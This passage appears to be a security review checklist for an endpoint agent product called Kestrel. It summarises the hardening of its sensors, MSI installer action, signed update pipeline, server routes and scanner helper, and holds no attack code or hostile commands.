- **Sensors:** task XML is read through `open_verified_file`: no reparse points in any ancestor, link count 1, final path checked, 256 KB cap. roxmltree rejects DTDs. The DNS wire parser is bounds-checked, compression pointers are limited, and the id, question and source are validated. DNS permits fail closed when the agent image is unknown and are outbound only. The translator loops run under `catch_unwind`.
- **M6 custom action** (`kestrel-msica`): deferred, `Impersonate="no"`, `HideTarget`, `MsiHiddenProperties`. The agent is started by absolute path with correct argument quoting. The token travels on stdin only and is never echoed. `|` splitting can only be steered by the installing admin.
- **Updates:**
  - Ed25519 over version, URL and sha256 (fixes the previous Info item).
  - Registration verifies the signature.
  - No server-side fetch, so no SSRF.
  - `classify_url` and `ServeDir` are traversal-safe.
  - Offers are only for newer versions; promotion is ring-ordered under `FOR UPDATE`.
  - HTTPS only, redirects refused, 512 MB cap. External hosts get web PKI without the client certificate.
  - The key file is created with a restricted ACL before the secret is written.
- **Server:**
  - Hunt fields come from a fixed enum with static SQL and bound values (ClickHouse and Postgres).
  - New routes all call `require` (`read`, `updates.write`, `devices.write`) and are audited.
  - Checklist approval enforces `action.privilege()` and uses only same-device evidence.
  - The Sigma pack is compiled in; seeding is idempotent and keeps admin edits, `enabled` and mode.
  - The NUL-strip ack covers SQLSTATE class 22 only, per device and per session, and cannot be used to suppress heartbeat tamper checks.
  - No new `dangerouslySetInnerHTML`.
- **kestrel-scan:** started by absolute path from the agent's folder; target list kept in the SYSTEM-only state directory; 15-minute and per-file timeouts; target and size caps; strict JSON output parsing.
